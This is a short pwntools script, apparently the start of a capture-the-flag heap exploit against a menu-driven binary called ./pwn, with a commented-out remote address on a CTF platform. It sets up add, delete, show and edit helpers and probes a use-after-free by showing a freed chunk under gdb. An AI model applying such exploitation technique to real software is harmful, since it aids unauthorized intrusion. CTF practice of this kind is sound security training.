from pwn import *
libc = ELF("./ld-2.32.so")
p = process("./pwn")
#p = remote("node3.buuoj.cn",28884)
def dbg():
    gdb.attach(p)
    pause()
def choice(num):
	p.sendlineafter(">>",str(num))

def add(size,text):
    choice(1)
    p.sendafter("Size:",str(size))
    p.sendafter("Content:",text)

def show():
    choice(3)

def edit(text):
    choice(5)
    p.sendafter("Content:",text)

def delete():
    choice(2)


add(0x60,"a"*0x10)
delete()

show()

dbg()


p.interactive()
